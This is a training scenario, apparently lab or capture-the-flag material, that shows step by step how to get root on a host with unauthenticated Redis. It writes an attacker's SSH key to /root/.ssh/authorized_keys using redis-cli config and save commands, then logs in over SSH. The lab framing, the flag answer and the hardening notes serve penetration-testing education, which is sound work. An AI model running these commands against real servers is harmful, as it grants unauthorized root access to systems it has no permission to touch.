# Scenario 14 — Open Redis to SSH Key Write to Root

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 02 Scanning, 03 Enumeration, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), `redis-cli`, `ssh-keygen`, `ssh`

## Story
Target `10.10.10.111` exposes Redis. Get a root shell.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.111
```
**Expected finding:** 22/ssh, 6379/redis (Redis server 5.0.x).

## Step 2 — Confirm no auth
```bash
redis-cli -h 10.10.10.111 ping
redis-cli -h 10.10.10.111 info server
redis-cli -h 10.10.10.111 config get dir
```
**Expected finding:** `PONG`, server info, working dir probably `/var/lib/redis` or `/root/`.

## Step 3 — Generate your SSH key
```bash
ssh-keygen -t rsa -b 2048 -f ./id_redis -N ''
(echo; cat id_redis.pub; echo) > key.txt
```

## Step 4 — Push key into Redis then dump as authorized_keys
```bash
cat key.txt | redis-cli -h 10.10.10.111 -x set crackit
redis-cli -h 10.10.10.111 config set dir /root/.ssh/
redis-cli -h 10.10.10.111 config set dbfilename authorized_keys
redis-cli -h 10.10.10.111 save
```
**Expected finding:** `OK` for each, `save` writes the file.

## Step 5 — SSH in as root
```bash
chmod 600 id_redis
ssh -i id_redis root@10.10.10.111
```
**Expected finding:** root shell.

## Step 6 — Final answer
```bash
cat /root/root.txt
```
**Answer format:** flag string.

## Gotchas across this chain
- Redis must run as a user whose home is writable — often `redis`, not `root`. If `/root/.ssh` fails, try `/var/lib/redis/.ssh` and SSH as `redis`.
- Newlines around the key matter: `(echo; cat pub; echo)` ensures redis doesn't glue it to RDB header garbage.
- Redis 6+ has protected-mode and ACLs on by default — this attack only works on unpatched 3–5.
- `config set dir` may be disabled in redis.conf hardening (`rename-command CONFIG ""`).
- SSH will reject the key if permissions are loose — `chmod 600 id_redis`.

## Variant questions this scenario teaches you to handle
- "What version of Redis is running?" → steps 1–2.
- "Is Redis authenticated?" → step 2.
- "Write a file through Redis" → step 4.
- "Get root on a Redis host" → full chain.
